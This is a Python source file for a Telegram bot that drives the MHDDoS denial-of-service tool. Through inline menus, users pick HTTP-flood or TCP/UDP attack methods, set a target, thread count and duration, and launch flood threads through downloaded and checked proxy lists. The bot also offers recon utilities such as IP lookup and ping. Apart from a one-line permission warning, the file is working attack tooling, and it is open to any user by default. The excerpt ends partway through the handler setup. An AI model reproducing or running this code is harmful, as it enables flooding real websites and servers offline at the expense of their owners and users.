#!/usr/bin/env python3
"""
MHDDoS Telegram Bot Interface

A professional Telegram bot interface for MHDDoS with inline keyboard navigation.
Configure the bot token via environment variable TELEGRAM_BOT_TOKEN or config.json.
"""

import asyncio
import logging
import os
from dataclasses import dataclass, field
from enum import Enum, auto
from json import JSONDecodeError, load
from pathlib import Path
from socket import gethostbyname
from threading import Event, Thread
from time import time
from typing import Any, Dict, List, Optional

from icmplib import ping as icmp_ping
from psutil import cpu_percent, net_io_counters, virtual_memory
from requests import get as requests_get
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)
from yarl import URL

# Import from start.py
from start import (
    BYTES_SEND,
    REQUESTS_SENT,
    HttpFlood,
    Layer4,
    Methods,
    ProxyManager,
    ProxyUtiles,
    Tools,
    ToolsConsole,
    con,
)
from PyRoxy import ProxyChecker, ProxyType

# Configure logging
logging.basicConfig(
    format='[%(asctime)s - %(levelname)s] %(message)s',
    datefmt="%H:%M:%S",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

__dir__ = Path(__file__).parent


class ConversationState(Enum):
    """Conversation states for the bot."""
    MAIN_MENU = auto()
    SELECT_LAYER = auto()
    SELECT_METHOD = auto()
    ENTER_TARGET = auto()
    ENTER_PORT = auto()
    ENTER_THREADS = auto()
    ENTER_DURATION = auto()
    ENTER_RPC = auto()
    SELECT_PROXY_TYPE = auto()
    CONFIRM_ATTACK = auto()
    TOOLS_MENU = auto()
    TOOLS_INPUT = auto()


@dataclass
class AttackConfig:
    """Configuration for an attack session."""
    method: str = ""
    target: str = ""
    port: int = 80
    threads: int = 100
    duration: int = 60
    rpc: int = 1
    proxy_type: int = 0
    is_layer7: bool = True
    
    # Default values stored as class attribute for consistency
    _defaults = {
        "method": "",
        "target": "",
        "port": 80,
        "threads": 100,
        "duration": 60,
        "rpc": 1,
        "proxy_type": 0,
        "is_layer7": True,
    }
    
    def reset(self):
        """Reset configuration to defaults."""
        for key, value in self._defaults.items():
            setattr(self, key, value)
    
    def copy(self) -> 'AttackConfig':
        """Create a copy of this configuration."""
        return AttackConfig(
            method=self.method,
            target=self.target,
            port=self.port,
            threads=self.threads,
            duration=self.duration,
            rpc=self.rpc,
            proxy_type=self.proxy_type,
            is_layer7=self.is_layer7
        )


@dataclass
class AttackSession:
    """Active attack session."""
    config: AttackConfig
    event: Event
    start_time: float
    threads: List[Thread] = field(default_factory=list)
    is_running: bool = False
    monitor_task: Optional[asyncio.Task] = None


def get_proxy_file_path(proxy_type: int) -> Path:
    """Get the proxy file path based on proxy type."""
    proxy_type_names = {
        1: "http",
        4: "socks4", 
        5: "socks5",
    }
    proxy_name = proxy_type_names.get(proxy_type, "http")
    return __dir__ / f"files/proxies/{proxy_name}.txt"


async def handle_proxy_list(proxy_type: int, threads: int = 100, url: Optional[URL] = None):
    """
    Handle proxy list similar to CLI version.
    Downloads and checks proxies if file doesn't exist.
    
    Args:
        proxy_type: Proxy type (0=All, 1=HTTP, 4=SOCKS4, 5=SOCKS5, 6=Random)
        threads: Number of threads for proxy checking
        url: Target URL for proxy validation
    
    Returns:
        Set of proxies or None
    """
    from random import choice as randchoice
    
    if proxy_type not in {4, 5, 1, 0, 6}:
        return None
    
    # Handle random proxy type
    if proxy_type == 6:
        proxy_type = randchoice([4, 5, 1])
    
    proxy_li = get_proxy_file_path(proxy_type)
    
    if not proxy_li.exists():
        logger.info("Proxy file doesn't exist, downloading proxies...")
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        
        try:
            # Download proxies from config providers
            proxies = ProxyManager.DownloadFromConfig(con, proxy_type)
            logger.info(f"Downloaded {len(proxies):,} proxies, checking...")
            
            # Check proxies
            proxies = ProxyChecker.checkAll(
                proxies, 
                timeout=5, 
                threads=threads,
                url=url.human_repr() if url else "http://httpbin.org/get",
            )
            
            if not proxies:
                logger.warning("No valid proxies found after checking")
                return None
            
            # Save checked proxies to file
            with proxy_li.open("w") as wr:
                for proxy in proxies:
                    wr.write(str(proxy) + "\n")
            
            logger.info(f"Saved {len(proxies):,} valid proxies to file")
            return proxies
            
        except Exception as e:
            logger.error(f"Failed to download/check proxies: {str(e)}")
            return None
    
    # Read existing proxies from file
    proxies = ProxyUtiles.readFromFile(proxy_li)
    if proxies:
        logger.info(f"Loaded {len(proxies):,} proxies from file")
    else:
        logger.warning("Empty proxy file")
        proxies = None
    
    return proxies


class MHDDoSBot:
    """Main Telegram Bot class for MHDDoS."""
    
    def __init__(self, token: str, allowed_users: Optional[List[int]] = None):
        self.token = token
        self.allowed_users = allowed_users or []
        self.user_configs: Dict[int, AttackConfig] = {}
        self.active_sessions: Dict[int, AttackSession] = {}
        self.user_tools_context: Dict[int, str] = {}
        
    def get_user_config(self, user_id: int) -> AttackConfig:
        """Get or create user configuration."""
        if user_id not in self.user_configs:
            self.user_configs[user_id] = AttackConfig()
        return self.user_configs[user_id]
    
    def is_authorized(self, user_id: int) -> bool:
        """Check if user is authorized to use the bot."""
        if not self.allowed_users:
            return True
        return user_id in self.allowed_users
    
    # Keyboard generators
    def get_main_menu_keyboard(self) -> InlineKeyboardMarkup:
        """Generate main menu keyboard."""
        keyboard = [
            [
                InlineKeyboardButton("Layer 7 Attack", callback_data="layer_7"),
                InlineKeyboardButton("Layer 4 Attack", callback_data="layer_4"),
            ],
            [
                InlineKeyboardButton("Tools", callback_data="tools"),
                InlineKeyboardButton("Status", callback_data="status"),
            ],
            [InlineKeyboardButton("Help", callback_data="help")],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_layer7_methods_keyboard(self) -> InlineKeyboardMarkup:
        """Generate Layer 7 methods keyboard."""
        methods = sorted(Methods.LAYER7_METHODS)
        keyboard = []
        row = []
        for i, method in enumerate(methods):
            row.append(InlineKeyboardButton(method, callback_data=f"method_{method}"))
            if len(row) == 3:
                keyboard.append(row)
                row = []
        if row:
            keyboard.append(row)
        keyboard.append([InlineKeyboardButton("Back", callback_data="back_main")])
        return InlineKeyboardMarkup(keyboard)
    
    def get_layer4_methods_keyboard(self) -> InlineKeyboardMarkup:
        """Generate Layer 4 methods keyboard."""
        methods = sorted(Methods.LAYER4_METHODS)
        keyboard = []
        row = []
        for i, method in enumerate(methods):
            row.append(InlineKeyboardButton(method, callback_data=f"method_{method}"))
            if len(row) == 3:
                keyboard.append(row)
                row = []
        if row:
            keyboard.append(row)
        keyboard.append([InlineKeyboardButton("Back", callback_data="back_main")])
        return InlineKeyboardMarkup(keyboard)
    
    def get_proxy_type_keyboard(self) -> InlineKeyboardMarkup:
        """Generate proxy type selection keyboard."""
        keyboard = [
            [
                InlineKeyboardButton("HTTP", callback_data="proxy_1"),
                InlineKeyboardButton("SOCKS4", callback_data="proxy_4"),
            ],
            [
                InlineKeyboardButton("SOCKS5", callback_data="proxy_5"),
                InlineKeyboardButton("Random", callback_data="proxy_6"),
            ],
            [
                InlineKeyboardButton("All Types", callback_data="proxy_0"),
                InlineKeyboardButton("No Proxy", callback_data="proxy_none"),
            ],
            [InlineKeyboardButton("Back", callback_data="back_main")],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_threads_keyboard(self) -> InlineKeyboardMarkup:
        """Generate thread count selection keyboard."""
        keyboard = [
            [
                InlineKeyboardButton("50", callback_data="threads_50"),
                InlineKeyboardButton("100", callback_data="threads_100"),
                InlineKeyboardButton("200", callback_data="threads_200"),
            ],
            [
                InlineKeyboardButton("500", callback_data="threads_500"),
                InlineKeyboardButton("1000", callback_data="threads_1000"),
                InlineKeyboardButton("Custom", callback_data="threads_custom"),
            ],
            [InlineKeyboardButton("Back", callback_data="back_main")],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_duration_keyboard(self) -> InlineKeyboardMarkup:
        """Generate duration selection keyboard."""
        keyboard = [
            [
                InlineKeyboardButton("30s", callback_data="duration_30"),
                InlineKeyboardButton("60s", callback_data="duration_60"),
                InlineKeyboardButton("120s", callback_data="duration_120"),
            ],
            [
                InlineKeyboardButton("300s", callback_data="duration_300"),
                InlineKeyboardButton("600s", callback_data="duration_600"),
                InlineKeyboardButton("Custom", callback_data="duration_custom"),
            ],
            [InlineKeyboardButton("Back", callback_data="back_main")],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_rpc_keyboard(self) -> InlineKeyboardMarkup:
        """Generate RPC selection keyboard."""
        keyboard = [
            [
                InlineKeyboardButton("1", callback_data="rpc_1"),
                InlineKeyboardButton("5", callback_data="rpc_5"),
                InlineKeyboardButton("10", callback_data="rpc_10"),
            ],
            [
                InlineKeyboardButton("50", callback_data="rpc_50"),
                InlineKeyboardButton("100", callback_data="rpc_100"),
                InlineKeyboardButton("Custom", callback_data="rpc_custom"),
            ],
            [InlineKeyboardButton("Back", callback_data="back_main")],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_confirm_keyboard(self) -> InlineKeyboardMarkup:
        """Generate confirmation keyboard."""
        keyboard = [
            [
                InlineKeyboardButton("Start Attack", callback_data="confirm_start"),
                InlineKeyboardButton("Cancel", callback_data="confirm_cancel"),
            ],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_tools_keyboard(self) -> InlineKeyboardMarkup:
        """Generate tools menu keyboard."""
        keyboard = [
            [
                InlineKeyboardButton("INFO", callback_data="tool_info"),
                InlineKeyboardButton("PING", callback_data="tool_ping"),
            ],
            [
                InlineKeyboardButton("CHECK", callback_data="tool_check"),
                InlineKeyboardButton("DSTAT", callback_data="tool_dstat"),
            ],
            [
                InlineKeyboardButton("TSSRV", callback_data="tool_tssrv"),
            ],
            [InlineKeyboardButton("Back", callback_data="back_main")],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_stop_keyboard(self) -> InlineKeyboardMarkup:
        """Generate stop attack keyboard."""
        keyboard = [
            [InlineKeyboardButton("Stop Attack", callback_data="stop_attack")],
            [InlineKeyboardButton("Back to Menu", callback_data="back_main")],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def format_config_summary(self, config: AttackConfig) -> str:
        """Format attack configuration summary."""
        layer = "Layer 7" if config.is_layer7 else "Layer 4"
        proxy_names = {0: "All", 1: "HTTP", 4: "SOCKS4", 5: "SOCKS5", 6: "Random", -1: "None"}
        proxy = proxy_names.get(config.proxy_type, str(config.proxy_type))
        
        summary = f"""
Attack Configuration:
---------------------
Layer: {layer}
Method: {config.method}
Target: {config.target}
Port: {config.port}
Threads: {config.threads}
Duration: {config.duration}s"""
        
        if config.is_layer7:
            summary += f"""
RPC: {config.rpc}
Proxy Type: {proxy}"""
        
        return summary
    
    # Command handlers
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Handle /start command."""
        user_id = update.effective_user.id
        
        if not self.is_authorized(user_id):
            await update.message.reply_text("You are not authorized to use this bot.")
            return ConversationHandler.END
        
        self.get_user_config(user_id).reset()
        
        welcome_text = """
MHDDoS Telegram Bot Interface

Select an option from the menu below to begin.

Warning: Only use this tool on systems you own or have explicit permission to test.
"""
        await update.message.reply_text(
            welcome_text,
            reply_markup=self.get_main_menu_keyboard()
        )
        return ConversationState.MAIN_MENU.value
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /help command."""
        help_text = """
MHDDoS Bot Commands:

/start - Start the bot and show main menu
/help - Show this help message
/status - Show current attack status
/stop - Stop all running attacks

Navigation:
- Use inline buttons to navigate
- Select attack layer (L4/L7)
- Choose attack method
- Configure parameters
- Confirm and start attack

Layer 7 Methods: HTTP-based attacks
Layer 4 Methods: TCP/UDP-based attacks

Tools:
- INFO: Get IP information
- PING: Ping target
- CHECK: Check website status
- DSTAT: Network statistics
- TSSRV: TeamSpeak SRV resolver
"""
        await update.message.reply_text(help_text)
    
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /status command."""
        user_id = update.effective_user.id
        
        if user_id not in self.active_sessions:
            await update.message.reply_text("No active attacks.")
            return
        
        session = self.active_sessions[user_id]
        if not session.is_running:
            await update.message.reply_text("No active attacks.")
            return
        
        elapsed = int(time() - session.start_time)
        remaining = max(0, session.config.duration - elapsed)
        
        status_text = f"""
Attack Status:
-------------
Target: {session.config.target}
Method: {session.config.method}
Elapsed: {elapsed}s
Remaining: {remaining}s
PPS: {Tools.humanformat(int(REQUESTS_SENT))}
BPS: {Tools.humanbytes(int(BYTES_SEND))}
"""
        await update.message.reply_text(
            status_text,
            reply_markup=self.get_stop_keyboard()
        )
    
    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /stop command."""
        user_id = update.effective_user.id
        
        if user_id in self.active_sessions:
            session = self.active_sessions[user_id]
            session.event.clear()
            session.is_running = False
            del self.active_sessions[user_id]
            await update.message.reply_text("Attack stopped.")
        else:
            await update.message.reply_text("No active attacks to stop.")
    
    # Callback query handlers
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Handle button callbacks."""
        query = update.callback_query
        await query.answer()
        
        user_id = update.effective_user.id
        if not self.is_authorized(user_id):
            await query.edit_message_text("You are not authorized to use this bot.")
            return ConversationHandler.END
        
        config = self.get_user_config(user_id)
        data = query.data
        
        # Main menu selections
        if data == "layer_7":
            config.is_layer7 = True
            await query.edit_message_text(
                "Select Layer 7 Method:",
                reply_markup=self.get_layer7_methods_keyboard()
            )
            return ConversationState.SELECT_METHOD.value
        
        elif data == "layer_4":
            config.is_layer7 = False
            await query.edit_message_text(
                "Select Layer 4 Method:",
                reply_markup=self.get_layer4_methods_keyboard()
            )
            return ConversationState.SELECT_METHOD.value
        
        elif data == "tools":
            await query.edit_message_text(
                "Select a tool:",
                reply_markup=self.get_tools_keyboard()
            )
            return ConversationState.TOOLS_MENU.value
        
        elif data == "status":
            if user_id not in self.active_sessions or not self.active_sessions[user_id].is_running:
                await query.edit_message_text(
                    "No active attacks.",
                    reply_markup=self.get_main_menu_keyboard()
                )
            else:
                session = self.active_sessions[user_id]
                elapsed = int(time() - session.start_time)
                remaining = max(0, session.config.duration - elapsed)
                status_text = f"""
Attack Status:
-------------
Target: {session.config.target}
Method: {session.config.method}
Elapsed: {elapsed}s
Remaining: {remaining}s
"""
                await query.edit_message_text(
                    status_text,
                    reply_markup=self.get_stop_keyboard()
                )
            return ConversationState.MAIN_MENU.value
        
        elif data == "help":
            help_text = """
MHDDoS Bot Help:

Layer 7 Methods: HTTP-based attacks
- GET, POST, CFB, BYPASS, OVH, etc.

Layer 4 Methods: TCP/UDP-based attacks
- TCP, UDP, SYN, DNS, NTP, etc.

Tools: Network utilities
- INFO, PING, CHECK, DSTAT, TSSRV

Use inline buttons to navigate and configure attacks.
"""
            keyboard = [[InlineKeyboardButton("Back", callback_data="back_main")]]
            await query.edit_message_text(
                help_text,
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return ConversationState.MAIN_MENU.value
        
        elif data == "back_main":
            config.reset()
            await query.edit_message_text(
                "Main Menu - Select an option:",
                reply_markup=self.get_main_menu_keyboard()
            )
            return ConversationState.MAIN_MENU.value
        
        # Method selection
        elif data.startswith("method_"):
            method = data.replace("method_", "")
            config.method = method
            await query.edit_message_text(
                f"Method: {method}\n\nEnter target URL/IP:"
            )
            return ConversationState.ENTER_TARGET.value
        
        # Threads selection
        elif data.startswith("threads_"):
            value = data.replace("threads_", "")
            if value == "custom":
                await query.edit_message_text("Enter custom thread count:")
                return ConversationState.ENTER_THREADS.value
            else:
                config.threads = int(value)
                await query.edit_message_text(
                    f"Threads: {config.threads}\n\nSelect duration:",
                    reply_markup=self.get_duration_keyboard()
                )
                return ConversationState.ENTER_DURATION.value
        
        # Duration selection
        elif data.startswith("duration_"):
            value = data.replace("duration_", "")
            if value == "custom":
                await query.edit_message_text("Enter custom duration (seconds):")
                return ConversationState.ENTER_DURATION.value
            else:
                config.duration = int(value)
                if config.is_layer7:
                    await query.edit_message_text(
                        f"Duration: {config.duration}s\n\nSelect RPC (Requests Per Connection):",
                        reply_markup=self.get_rpc_keyboard()
                    )
                    return ConversationState.ENTER_RPC.value
                else:
                    # Layer 4 doesn't need RPC, go to confirmation
                    await query.edit_message_text(
                        self.format_config_summary(config) + "\n\nConfirm attack?",
                        reply_markup=self.get_confirm_keyboard()
                    )
                    return ConversationState.CONFIRM_ATTACK.value
        
        # RPC selection
        elif data.startswith("rpc_"):
            value = data.replace("rpc_", "")
            if value == "custom":
                await query.edit_message_text("Enter custom RPC value:")
                return ConversationState.ENTER_RPC.value
            else:
                config.rpc = int(value)
                await query.edit_message_text(
                    f"RPC: {config.rpc}\n\nSelect proxy type:",
                    reply_markup=self.get_proxy_type_keyboard()
                )
                return ConversationState.SELECT_PROXY_TYPE.value
        
        # Proxy type selection
        elif data.startswith("proxy_"):
            value = data.replace("proxy_", "")
            if value == "none":
                config.proxy_type = -1
            else:
                config.proxy_type = int(value)
            await query.edit_message_text(
                self.format_config_summary(config) + "\n\nConfirm attack?",
                reply_markup=self.get_confirm_keyboard()
            )
            return ConversationState.CONFIRM_ATTACK.value
        
        # Confirmation
        elif data == "confirm_start":
            await self.start_attack(query, user_id, config)
            return ConversationState.MAIN_MENU.value
        
        elif data == "confirm_cancel":
            config.reset()
            await query.edit_message_text(
                "Attack cancelled.\n\nMain Menu:",
                reply_markup=self.get_main_menu_keyboard()
            )
            return ConversationState.MAIN_MENU.value
        
        # Stop attack
        elif data == "stop_attack":
            if user_id in self.active_sessions:
                session = self.active_sessions[user_id]
                session.event.clear()
                session.is_running = False
                del self.active_sessions[user_id]
                await query.edit_message_text(
                    "Attack stopped.\n\nMain Menu:",
                    reply_markup=self.get_main_menu_keyboard()
                )
            else:
                await query.edit_message_text(
                    "No active attacks.\n\nMain Menu:",
                    reply_markup=self.get_main_menu_keyboard()
                )
            return ConversationState.MAIN_MENU.value
        
        # Tools
        elif data.startswith("tool_"):
            tool = data.replace("tool_", "")
            self.user_tools_context[user_id] = tool
            
            if tool == "dstat":
                await self.run_dstat(query)
                return ConversationState.TOOLS_MENU.value
            else:
                prompts = {
                    "info": "Enter IP address or domain:",
                    "ping": "Enter IP address or domain:",
                    "check": "Enter URL to check (include http:// or https://):",
                    "tssrv": "Enter domain for TeamSpeak SRV lookup:",
                }
                await query.edit_message_text(prompts.get(tool, "Enter target:"))
                return ConversationState.TOOLS_INPUT.value
        
        return ConversationState.MAIN_MENU.value
    
    async def handle_text_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Handle text input from user."""
        user_id = update.effective_user.id
        config = self.get_user_config(user_id)
        text = update.message.text.strip()
        
        # Check current state based on config
        if not config.target and config.method:
            # Entering target
            target = text
            
            # For Layer 7, we need HTTP URLs
            # For Layer 4, we can accept plain IP:port or hostname:port
            if config.is_layer7 and not target.startswith("http"):
                target = "http://" + target
            elif not config.is_layer7 and not target.startswith("http"):
                # For Layer 4, add http:// prefix just for URL parsing purposes
                target = "http://" + target
            
            try:
                url = URL(target)
                config.target = url.host
                config.port = url.port or 80
                
                if config.is_layer7:
                    # Try to resolve hostname
                    if config.method != "TOR":
                        try:
                            gethostbyname(url.host)
                        except Exception:
                            await update.message.reply_text(
                                "Cannot resolve hostname. Please enter a valid target:",
                            )
                            return ConversationState.ENTER_TARGET.value
                    
                    await update.message.reply_text(
                        f"Target: {config.target}\n\nSelect thread count:",
                        reply_markup=self.get_threads_keyboard()
                    )
                    return ConversationState.ENTER_THREADS.value
                else:
                    # Layer 4 - ask for port if not in URL
                    if not url.port:
                        await update.message.reply_text(
                            f"Target: {config.target}\n\nEnter port (1-65535):"
                        )
                        return ConversationState.ENTER_PORT.value
                    else:
                        await update.message.reply_text(
                            f"Target: {config.target}:{config.port}\n\nSelect thread count:",
                            reply_markup=self.get_threads_keyboard()
                        )
                        return ConversationState.ENTER_THREADS.value
                        
            except Exception as e:
                await update.message.reply_text(
                    f"Invalid target format. Please enter a valid URL or IP:\n{str(e)}"
                )
                return ConversationState.ENTER_TARGET.value
        
        elif config.target and not config.port and not config.is_layer7:
            # Entering port for Layer 4
            try:
                port = int(text)
                if 1 <= port <= 65535:
                    config.port = port
                    await update.message.reply_text(
                        f"Port: {config.port}\n\nSelect thread count:",
                        reply_markup=self.get_threads_keyboard()
                    )
                    return ConversationState.ENTER_THREADS.value
                else:
                    await update.message.reply_text("Port must be between 1 and 65535. Enter port:")
                    return ConversationState.ENTER_PORT.value
            except ValueError:
                await update.message.reply_text("Invalid port. Enter a number between 1-65535:")
                return ConversationState.ENTER_PORT.value
        
        # Check for custom threads input
        elif text.isdigit() and config.target:
            value = int(text)
            
            # Could be threads, duration, or RPC
            if config.threads == 100:  # Default, likely entering custom threads
                config.threads = value
                await update.message.reply_text(
                    f"Threads: {config.threads}\n\nSelect duration:",
                    reply_markup=self.get_duration_keyboard()
                )
                return ConversationState.ENTER_DURATION.value
            elif config.duration == 60:  # Default, likely entering custom duration
                config.duration = value
                if config.is_layer7:
                    await update.message.reply_text(
                        f"Duration: {config.duration}s\n\nSelect RPC:",
                        reply_markup=self.get_rpc_keyboard()
                    )
                    return ConversationState.ENTER_RPC.value
                else:
                    await update.message.reply_text(
                        self.format_config_summary(config) + "\n\nConfirm attack?",
                        reply_markup=self.get_confirm_keyboard()
                    )
                    return ConversationState.CONFIRM_ATTACK.value
            elif config.is_layer7 and config.rpc == 1:  # Default, likely entering custom RPC
                config.rpc = value
                await update.message.reply_text(
                    f"RPC: {config.rpc}\n\nSelect proxy type:",
                    reply_markup=self.get_proxy_type_keyboard()
                )
                return ConversationState.SELECT_PROXY_TYPE.value
        
        return ConversationState.MAIN_MENU.value
    
    async def handle_tools_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Handle tools input from user."""
        user_id = update.effective_user.id
        tool = self.user_tools_context.get(user_id, "")
        target = update.message.text.strip()
        
        if not target:
            await update.message.reply_text(
                "Invalid input. Try again.",
                reply_markup=self.get_tools_keyboard()
            )
            return ConversationState.TOOLS_MENU.value
        
        # Clean up target
        domain = target.replace('https://', '').replace('http://', '')
        if "/" in domain:
            domain = domain.split("/")[0]
        
        if tool == "info":
            await update.message.reply_text("Fetching information...")
            info = ToolsConsole.info(domain)
            if info.get("success", True):
                result = f"""
IP Information for {domain}:
---------------------------
Country: {info.get('country', 'N/A')}
City: {info.get('city', 'N/A')}
Region: {info.get('region', 'N/A')}
ISP: {info.get('isp', 'N/A')}
Org: {info.get('org', 'N/A')}
"""
            else:
                result = f"Failed to get information for {domain}"
            
            await update.message.reply_text(
                result,
                reply_markup=self.get_tools_keyboard()
            )
        
        elif tool == "ping":
            await update.message.reply_text("Pinging...")
            try:
                r = icmp_ping(domain, count=5, interval=0.2)
                result = f"""
Ping Results for {domain}:
-------------------------
Address: {r.address}
Ping: {r.avg_rtt:.2f}ms
Packets: {r.packets_received}/{r.packets_sent}
Status: {"ONLINE" if r.is_alive else "OFFLINE"}
"""
            except Exception as e:
                result = f"Ping failed: {str(e)}"
            
            await update.message.reply_text(
                result,
                reply_markup=self.get_tools_keyboard()
            )
        
        elif tool == "check":
            await update.message.reply_text("Checking...")
            result = ""
            try:
                url = target if target.startswith("http") else f"http://{target}"
                r = requests_get(url, timeout=20)
                try:
                    result = f"""
Website Check for {url}:
-----------------------
Status Code: {r.status_code}
Status: {"ONLINE" if r.status_code <= 500 else "OFFLINE"}
"""
                finally:
                    r.close()
            except Exception as e:
                result = f"Check failed: {str(e)}"
            
            await update.message.reply_text(
                result,
                reply_markup=self.get_tools_keyboard()
            )
        
        elif tool == "tssrv":
            await update.message.reply_text("Looking up SRV records...")
            info = ToolsConsole.ts_srv(domain)
            result = f"""
TeamSpeak SRV for {domain}:
--------------------------
TCP: {info.get('_tsdns._tcp.', 'Not found')}
UDP: {info.get('_ts3._udp.', 'Not found')}
"""
            await update.message.reply_text(
                result,
                reply_markup=self.get_tools_keyboard()
            )
        
        return ConversationState.TOOLS_MENU.value
    
    async def run_dstat(self, query) -> None:
        """Run DSTAT tool."""
        nd = net_io_counters(pernic=False)
        result = f"""
Network Statistics:
------------------
Bytes Sent: {Tools.humanbytes(nd.bytes_sent)}
Bytes Received: {Tools.humanbytes(nd.bytes_recv)}
Packets Sent: {Tools.humanformat(nd.packets_sent)}
Packets Received: {Tools.humanformat(nd.packets_recv)}
Errors In: {nd.errin}
Errors Out: {nd.errout}
Drop In: {nd.dropin}
Drop Out: {nd.dropout}
CPU Usage: {cpu_percent()}%
Memory: {virtual_memory().percent}%
"""
        await query.edit_message_text(
            result,
            reply_markup=self.get_tools_keyboard()
        )
    
    async def start_attack(self, query, user_id: int, config: AttackConfig) -> None:
        """Start the attack with given configuration."""
        # Stop any existing attack and cancel its monitor task
        if user_id in self.active_sessions:
            old_session = self.active_sessions[user_id]
            old_session.event.clear()
            old_session.is_running = False
            if old_session.monitor_task and not old_session.monitor_task.done():
                old_session.monitor_task.cancel()
        
        event = Event()
        
        session = AttackSession(
            config=config.copy(),
            event=event,
            start_time=time()
        )
        
        self.active_sessions[user_id] = session
        
        # Reset counters
        REQUESTS_SENT.set(0)
        BYTES_SEND.set(0)
        
        try:
            if config.is_layer7:
                await self._start_layer7_attack(query, session)
            else:
                await self._start_layer4_attack(query, session)
            
            # Start monitoring task and store reference for cleanup
            session.monitor_task = asyncio.create_task(self._monitor_attack(query, user_id, session))
            
        except Exception as e:
            session.event.clear()
            session.is_running = False
            del self.active_sessions[user_id]
            await query.edit_message_text(
                f"Attack failed to start: {str(e)}\n\nMain Menu:",
                reply_markup=self.get_main_menu_keyboard()
            )
    
    async def _start_layer7_attack(self, query, session: AttackSession) -> None:
        """Start Layer 7 attack."""
        config = session.config
        
        # Prepare URL
        urlraw = config.target if config.target.startswith("http") else f"http://{config.target}"
        url = URL(urlraw)
        host = url.host
        
        if config.method != "TOR":
            try:
                host = gethostbyname(url.host)
            except Exception as e:
                raise Exception(f"Cannot resolve hostname: {str(e)}")
        
        # Load user agents and referers
        useragent_li = __dir__ / "files/useragent.txt"
        referers_li = __dir__ / "files/referers.txt"
        
        uagents = set()
        referers = set()
        
        if useragent_li.exists():
            uagents = set(a.strip() for a in useragent_li.open("r").readlines() if a.strip())
        if referers_li.exists():
            referers = set(a.strip() for a in referers_li.open("r").readlines() if a.strip())
        
        # Handle proxies using PyRoxy (same as CLI)
        proxies = None
        if config.proxy_type >= 0:
            proxies = await handle_proxy_list(config.proxy_type, config.threads, url)
        
        # Start threads
        for thread_id in range(config.threads):
            t = HttpFlood(
                thread_id, url, host, config.method, config.rpc,
                session.event, uagents, referers, proxies
            )
            t.start()
            session.threads.append(t)
        
        session.event.set()
        session.is_running = True
        
        proxy_info = f"\nProxies: {len(proxies):,}" if proxies else "\nProxies: None"
        await query.edit_message_text(
            f"Attack started!\n\nTarget: {config.target}\nMethod: {config.method}\nThreads: {config.threads}\nDuration: {config.duration}s{proxy_info}",
            reply_markup=self.get_stop_keyboard()
        )
    
    async def _start_layer4_attack(self, query, session: AttackSession) -> None:
        """Start Layer 4 attack."""
        config = session.config
        
        target = config.target
        try:
            target = gethostbyname(target)
        except Exception as e:
            raise Exception(f"Cannot resolve hostname: {str(e)}")
        
        # Handle proxies for supported methods using PyRoxy (same as CLI)
        proxies = None
        if config.method in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"} and config.proxy_type >= 0:
            proxies = await handle_proxy_list(config.proxy_type, config.threads)
        
        # Start threads
        for _ in range(config.threads):
            t = Layer4(
                (target, config.port), None, config.method,
                session.event, proxies, con.get("MINECRAFT_DEFAULT_PROTOCOL", 47)
            )
            t.start()
            session.threads.append(t)
        
        session.event.set()
        session.is_running = True
        
        proxy_info = f"\nProxies: {len(proxies):,}" if proxies else ""
        await query.edit_message_text(
            f"Attack started!\n\nTarget: {target}:{config.port}\nMethod: {config.method}\nThreads: {config.threads}\nDuration: {config.duration}s{proxy_info}",
            reply_markup=self.get_stop_keyboard()
        )
    
    async def _monitor_attack(self, query, user_id: int, session: AttackSession) -> None:
        """Monitor attack progress and stop when duration expires."""
        start_time = session.start_time
        duration = session.config.duration
        
        while session.is_running and time() < start_time + duration:
            await asyncio.sleep(5)
            
            if not session.is_running:
                break
            
            # Update is tricky in Telegram - we can't edit messages too frequently
            # Just wait for duration to expire
        
        # Stop attack
        if session.is_running:
            session.event.clear()
            session.is_running = False
            
            if user_id in self.active_sessions:
                del self.active_sessions[user_id]
            
            # Try to notify user
            try:
                await query.message.reply_text(
                    f"Attack completed.\n\nTarget: {session.config.target}\nDuration: {session.config.duration}s",
                    reply_markup=self.get_main_menu_keyboard()
                )
            except Exception:
                pass  # Message may have been deleted
    
    def run(self) -> None:
        """Run the bot."""
        application = Application.builder().token(self.token).build()
        
        # Create conversation handler
        conv_handler = ConversationHandler(
            entry_points=[CommandHandler("start", self.start_command)],
            states={
                ConversationState.MAIN_MENU.value: [
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.SELECT_LAYER.value: [
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.SELECT_METHOD.value: [
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.ENTER_TARGET.value: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text_input),
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.ENTER_PORT.value: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text_input),
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.ENTER_THREADS.value: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text_input),
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.ENTER_DURATION.value: [
